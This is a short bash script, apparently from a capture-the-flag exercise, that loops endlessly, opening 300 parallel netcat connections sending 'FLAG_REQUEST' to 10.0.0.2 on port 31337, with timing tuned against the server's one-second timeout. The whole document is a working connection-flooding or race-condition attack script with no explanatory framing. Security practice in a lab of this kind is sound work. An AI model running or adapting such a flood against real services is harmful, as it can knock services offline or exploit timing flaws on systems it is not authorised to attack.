#!/bin/bash
# sweet_spot.sh

while true; do
  # Optimal values from testing:
  CONNECTIONS=300
  DELAY=0.1  # 10% faster than server's 1s timeout
  
  # Launch connections
  for i in $(seq 1 $CONNECTIONS); do
    echo "FLAG_REQUEST" | nc -v -w 1 10.0.0.2 31337 &
    sleep 0.001
  done
  
  # Maintain rate
  sleep $DELAY
done
